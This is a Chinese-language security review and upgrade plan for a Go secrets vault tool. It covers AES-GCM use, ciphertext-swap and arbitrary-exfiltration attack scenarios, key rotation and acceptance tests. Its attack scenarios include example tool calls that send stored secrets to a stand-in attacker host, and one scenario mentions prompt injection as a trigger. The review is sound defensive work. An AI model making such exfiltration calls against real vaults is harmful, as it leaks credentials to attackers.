# 加密与密钥管理：现状评审与升级方案

> 评审对象：`internal/vault/vault.go`（v0.1.x）
> 结论：加密原语用得对，**缺的是"绑定"和"轮换"**，另外有一条策略缺口比加密本身更危险。

---

## 1. 现状：哪些做对了

| 项 | 实现 | 评价 |
|---|---|---|
| 算法 | AES-256-GCM | 对。AEAD，自带完整性 |
| nonce | 每条随机 12 字节，独立存储 | 对。小规模下碰撞概率可忽略 |
| 主密钥长度 | 强制 32 字节，解码失败直接报错 | 对。没有静默降级 |
| 明文落盘 | 只写 cipher / nonce | 对。WAL 里也只有密文 |
| 列表接口 | 只返回元数据 | 对 |
| 主密钥文件 | `0600`，目录 `0700` | 对 |
| 无主密钥时 | 自动生成随机密钥 | 对（但下面的问题见 §2.3） |

这几条说明：**它不是"用错了密码学"，而是"少做了几件工程上的事"**。所以升级不需要换算法，只需要补结构。

---

## 2. 五个具体攻击场景

按"攻击者能做到什么"列，不按术语列。

### 2.1 密文替换（不需要主密钥）—— **当前可成功**

前提：攻击者能写 `vault.db`（同机另一个进程、恢复了一份被篡改的备份、或 CI 里挂载了卷）。

```
步骤 1  把 github 那条的 cipher/nonce 复制到 internal-admin 那条
步骤 2  agent 正常调用 kb_http{secret:"internal-admin", url:"https://attacker.example"}
步骤 3  服务端用 internal-admin 的密文解出 github 的 token，注入请求头发给攻击者
        → token 外泄，审计里只看到一次"正常的 internal-admin 调用"
```

**根因**：`Seal(nil, nonce, secret, nil)` 的 AAD 是 `nil`——密文没有绑定它的名字。任何一段合法密文，可以贴到任何一行上，解密都成功。

**修法**：AAD = `fmt || key_id || name`。替换后 `Open` 直接失败（`message authentication failed`）。

代价：约 10 行代码，**这是整份方案里性价比最高的一条**。

### 2.2 任意外发（拿到令牌即可）—— **当前可成功**

`kb_http` 允许任意 `url`。拿到服务令牌的人（或提示注入成功的一次调用），可以让服务端**把任何一条密钥发到任何域名**：

```
kb_http{secret:"aws-prod", url:"https://attacker.example", auth:"header"}
```

审计会记下来，但泄露已经发生。

**根因**：密钥有"谁能取"的控制（令牌），没有"能发到哪"的控制。

**修法**：每条密钥加 `allow_hosts`（可为空 = 禁止外发）。默认拒绝，配置后才放行。
这条不是加密问题，但**它比 2.1 更容易被利用**。

### 2.3 主密钥从环境变量泄漏 —— **当前可读**

`KEYBATON_MASTER_KEY` 会出现在：

| 位置 | 谁能看 |
|---|---|
| `/proc/<pid>/environ` | 同 UID 的任何进程 |
| `docker inspect` | docker 组的任何人 |
| systemd unit 文件 | 有读权限的任何人 |
| CI 日志（如果 `set -x`） | 看日志的人 |

**修法**：优先文件；再支持"从外部命令读"（macOS Keychain / `pass` / `systemd-creds`）；环境变量保留但启动时打一次警告。

### 2.4 无法轮换 —— **当前做不到**

没有 key id，没有版本字段。主密钥一旦疑似泄露，只能：

1. 手工导出全部明文 → 换密钥 → 重新导入（明文在这中间暴露）
2. 或者放弃整个库

**修法**：`key_id` 列 + `keybaton rotate`（重新加密全部条目）+ 旧密钥保留一段时间用于回滚。

### 2.5 明文在内存里的生命周期 —— **当前不可控**

```go
pt, _ := s.aead.Open(nil, nonce, ct, nil)
e.Secret = string(pt)     // 转成 string，无法擦除
```

Go 的 `string` 不可变，GC 前一直留在堆里；`run` 还会把它塞进子进程环境（必然存在），`All()` 更是**一次性解出全部明文**。

**修法**：用 `[]byte` 全程传递，用完 `zero()`；`run` 默认只注入 `--only` 指定的条目（现在是全量注入，等于任何脚本都能拿到全部钥匙）。

## 3. 升级方案

### P0：加密底座（1 天，不改架构）

| # | 改动 | 防的是 |
|---|---|---|
| 1 | **AAD 绑定**：`fmt‖key_id‖name` | 2.1 密文替换 |
| 2 | **`key_id` + `fmt` 列**：密文自带版本 | 2.4 轮换的前提 |
| 3 | **`keybaton rotate`**：生成新 key、重加密全部、保留旧 key 一次回滚 | 2.4 |
| 4 | **`allow_hosts` 白名单**：默认拒绝外发 | 2.2 |
| 5 | **`run` 默认不全量注入**：必须 `--only` 或 `--all` 显式 | 2.5 爆炸半径 |
| 6 | 明文用 `[]byte` + 用完清零；主密钥只留一份副本 | 2.5 |

数据格式（v2）：

```
cipher = [1 byte fmt][2 byte key_id][12 byte nonce][ciphertext+tag]
AAD    = fmt ‖ key_id ‖ name
```

老库（v1，无前缀、无 AAD）在打开时**自动迁移**：逐条用旧方式解密、用新方式重写，`fmt=2`。迁移失败即中止，不动原库（先备份）。

### P1：运维与取证（3–5 天）

| # | 改动 | 价值 |
|---|---|---|
| 7 | `keybaton backup`：生成加密备份包（age/scrypt）+ SHA256 | 备份本身不再是"裸钥匙" |
| 8 | 审计哈希链：每行带 `H(prev_hash‖row)`，`keybaton audit --verify` | 审计不可静默篡改 |
| 9 | 主密钥来源优先级：文件 > 外部命令 > 环境变量（带警告） | 缓解 2.3 |
| 10 | 口令模式：Argon2id 从口令派生 KEK（可选，替代裸密钥文件） | 没有安全存储介质时的退路 |
| 11 | `username` / `note` 也加密（或明确文档说明为明文） | 元数据泄露 |

### P2：需要外部依赖（按需）

| # | 改动 | 前提 |
|---|---|---|
| 12 | 信封加密：主密钥只包 per-secret DEK，轮换只 rewarp（不用重加密数据） | 条目数 > 1000 时才值得 |
| 13 | 远程解封：KEK 放 KMS / Vault transit，本机只存 wrapped DEK | 多机共用一套库时 |
| 14 | TPM / Secure Enclave 绑定 | 有硬件信任根时 |
| 15 | mlock 防 swap | 单机高强度场景 |

**不建议做的**：自己写 KDF、自己写流密码、把加密换成"混淆"。现在的算法组合是标准答案，问题不在算法。

## 4. 迁移与兼容

```
v0.1 库  ──打开──> 检测无 fmt 前缀 ──> 备份 vault.db ──> 逐条重加密 ──> 写 fmt=2
                                              │
                                              └─ 任何一条失败：回滚，报错，不改库
```

- 迁移是**一次性、可回滚**的（旧库改名为 `vault.db.pre-v2`）
- 新旧条目可以在同一库共存（按 `fmt` 分支解密），所以不必强制全量迁移
- `keybaton rotate` 只处理 `fmt=2`；对 `fmt=1` 先迁移

## 5. 验收测试（每条都要有断言，不能靠"应该可以"）

| # | 测试 | 期望 |
|---|---|---|
| 1 | 交换两行的 cipher/nonce | 解密失败，审计记 `decrypt_failed` |
| 2 | 篡改 cipher 任意一字节 | 解密失败 |
| 3 | 用旧 key_id 的密文配新密钥 | 解密失败 |
| 4 | `rotate` 后全部条目可读 | 明文一致 |
| 5 | `rotate` 后旧备份 + 新库混合 | 不会静默解出错误明文 |
| 6 | `allow_hosts` 未配置时外发 | 拒绝，审计记 `host_denied` |
| 7 | `allow_hosts` 命中时外发 | 放行 |
| 8 | `run` 不带 `--only`/`--all` | 报错退出（不注入） |
| 9 | 迁移中断（kill -9） | 原库不变，可重跑 |
| 10 | 明文残留 | 进程退出后 core dump 中搜不到 key（尽力而为，不能 100% 保证） |

## 6. 工作量与建议

| 阶段 | 内容 | 人日 |
|---|---|---|
| P0 | AAD + key_id + rotate + allow_hosts + run 默认收紧 | **1–1.5** |
| P1 | 备份加密 + 审计哈希链 + 主密钥来源 + 口令模式 | **3–5** |
| P2 | 信封 / KMS / TPM | 按需，5+ |

**建议先做 P0 的 1、2、4 三条**（半天）：AAD 绑定、key_id 列、`allow_hosts` 白名单。

理由：

- 这三条堵的是**真实可利用**的路径（密文替换、任意外发），不是理论风险
- 都不改数据模型的主体，迁移简单
- 做完之后，"keybaton 的加密"从"算法正确"变成"结构也正确"

`rotate` 和 `run` 收紧放在同一批的第二小步，因为它们需要改 CLI 行为，要同步文档。
